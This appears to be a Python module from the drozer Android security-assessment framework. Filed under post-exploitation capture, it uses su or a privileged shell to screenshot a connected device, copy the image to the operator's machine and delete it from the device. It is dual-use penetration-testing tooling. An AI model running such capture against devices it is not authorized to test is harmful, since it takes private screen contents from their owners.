import os, subprocess, time

from drozer.modules import common, Module

class Screenshot(Module, common.BusyBox, common.SuperUser, common.Shell, common.FileSystem, common.ClassLoader):

    name = "Take a screenshot of the device"
    description = "Take a screenshot of the device. Relies on minimal-su being correcly installed on the device (see tools.setup.minimalsu)"
    examples = """dz> run post.capture.screenshot
Done. Saved at /home/user/1416002550.png
"""
    author = "Tyrone (@mwrlabs)"
    date = "2013-04-18"
    license = "BSD (3 clause)"
    path = ["post", "capture"]

    def add_arguments(self, parser):
        parser.add_argument("--override-checks", action="store_true", default=False, help="ignore checks and use this module")

    def execute(self, arguments):

        # Check for screencap binary
        if not self.exists("/system/bin/screencap"):
            self.stdout.write("[x] No known methods for taking screenshots on this device. Exiting...\n")
            return

        # Check if busybox installed
        if not self.isBusyBoxInstalled():
            self.stderr.write("This command requires BusyBox to complete. Run tools.setup.busybox and then retry.\n")
            return

        # Check if running as privileged user
        userId = self.busyBoxExec("id -u")
        if ("1000" == userId) or ("2000" == userId) or ("0" == userId):
            privilegedUser = True
        else:
            privilegedUser = False 

        # Check for existence of minimal-su
        if not self.isMinimalSuInstalled() and not privilegedUser:
            self.stdout.write("[-] You are not a privileged user and no minimal su binary available (see tools.setup.minimalsu).\n")
            if not arguments.override_checks:
                return
            self.stdout.write("[*] Continuing...\n")
            
        # Make timestamped file name
        filename = str(int(time.time())) + ".png"
        
        # Take screenshot
        screencapCmd = "screencap -p %s/screenshot.png" % self.workingDir()
        chmodCmd = "chmod 666 %s/screenshot.png" % self.workingDir()
        if privilegedUser:
            self.shellExec(screencapCmd)
            self.shellExec(chmodCmd)
        else:
            self.suExec(screencapCmd)
            self.suExec(chmodCmd)
        
        # Download
        length = self.downloadFile("%s/screenshot.png" % self.workingDir(), filename)
        
        # Remove screenshot from device
        self.shellExec("rm %s/screenshot.png" % self.workingDir())

        # Full path to file
        fullPath = os.path.join(os.getcwd(), filename)
        
        if length != None:
            self.stdout.write("[+] Done. Saved at %s \n" % fullPath)
            
            # Open in default application
            if os.name == 'posix':
                subprocess.call(('xdg-open', filename))
            elif os.name == 'nt':
                os.startfile(filename)
            elif os.name == 'darwin':
                os.system("open " + filename);
        else:
            self.stderr.write("[-] Screenshot download failed.\n")
